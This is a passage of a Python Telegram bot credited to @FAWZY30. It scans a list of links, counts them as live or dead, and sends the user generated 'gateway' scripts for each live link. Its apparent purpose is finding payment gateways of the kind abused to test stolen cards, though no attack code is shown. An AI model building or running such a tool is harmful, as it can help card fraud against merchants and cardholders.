📌 Total Links: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
Url : ...
Respons : ...
━━━━━━━━━━━━━━━━━━
⏱️ Checked 0 of {total}
🛑 /stop to stop""")
        
        if not status_msg:
            return
        
        # ═══ Thread لتحديث الحالة ═══
        def update_status():
            last_text = ""
            while True:
                time.sleep(10)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False):
                            break
                        
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        current_url = processing_status[user_id]['current_url']
                        current_respons = processing_status[user_id]['current_respons']
                        
                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        
                        text = f"""📊 File #1 - Scanning links...
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {percent}% {bar}
Url : <code>{current_url[:60] if current_url else '...'}</code>
Respons : <code>{current_respons[:60] if current_respons else '...'}</code>
━━━━━━━━━━━━━━━━━━
⏱️ Checked {processed} of {total}
🛑 /stop to stop"""
                        
                        if text != last_text:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                            except:
                                pass
                except:
                    pass
        
        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()
        
        time.sleep(1)
        
        # ═══ الفحص الرئيسي ═══
        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False):
                break
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'
            
            # فحص سريع بـ Requests
            result = check_with_requests(link)
            
            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                
                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']
                    
                    # ابعت الكود
                    try:
                        code = generate_gateway_code(result)
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        
                        caption = f"""💎 <b>Live Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link:</b> <code>{result['link']}</code>
💬 <b>Respons:</b> <code>{result['respons']}</code>
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30"""
                        
                        safe_send_document(chat_id, file_name, caption=caption)
                        try:
                            os.remove(file_name)
                        except:
                            pass
                        time.sleep(1)
                    except Exception as e:
                        print(f"Send error: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
            
            # GC كل 50
            if idx % 50 == 0 and idx > 0:
                gc.collect()
            
            # delay بسيط
            time.sleep(0.5)
        
        # ═══ انتهى ═══
        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']
        
        updater.join(timeout=3)
        
        final_text = f"""📊 <b>✅ Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 <b>Total Links:</b> {total}
✅ <b>Live (Sent):</b> {live}
❌ <b>Dead:</b> {dead}
💯 <b>Success Rate:</b> {int((live/total)*100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30"""
        
        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except:
            safe_send_message(chat_id, final_text)
        
        if user_id in processing_status:
            del processing_status[user_id]
    
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ <b>Error:</b> {str(e)[:100]}")
        if 'user_id' in locals() and user_id in processing_status:
            del processing_status[user_id]


# ═══ Block / Unblock ═══
@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "⛔ No permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        safe_send_message(message.chat.id, f"✅ {user_id_to_block} blocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")


@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "⛔ No permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        safe_send_message(message.chat.id, f"✅ {user_id_to_unblock} unblocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")


# ═══════════════════════════════════════════════════════════
# ═══ Run ═══
# ═══════════════════════════════════════════════════════════

print('🚀 Bot is running...')

if __name__ == '__main__':
    # حذف Webhook عشان نتجنب 409
    try:
        bot.delete_webhook(drop_pending_updates=True)
        print("✅ Webhook deleted")
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Webhook error: {e}")
    
    # التشغيل مع Anti-Error Loop
    while True:
        try:
            print("🔄 Starting bot polling...")
            bot.infinity_polling(timeout=30, long_polling_timeout=30)
        except KeyboardInterrupt:
            print('🛑 Bot stopped')
            break
        except Exception as e:
            error_str = str(e)
            if "409" in error_str:
                print("⚠️ 409 Conflict - Waiting 30s...")
                time.sleep(30)
            elif "502" in error_str or "Bad Gateway" in error_str:
                print("⚠️ 502 - Waiting 10s...")
                time.sleep(10)
            elif "429" in error_str:
                print("⚠️ 429 - Waiting 30s...")
                time.sleep(30)
            elif "timeout" in error_str.lower():
                print("⚠️ Timeout - Waiting 5s...")
                time.sleep(5)
            elif "Connection" in error_str:
                print("⚠️ Connection - Waiting 5s...")
                time.sleep(5)
            elif "500" in error_str:
                print("⚠️ 500 - Waiting 10s...")
                time.sleep(10)
            else:
                print(f"⚠️ Error: {error_str[:100]}")
                time.sleep(5)
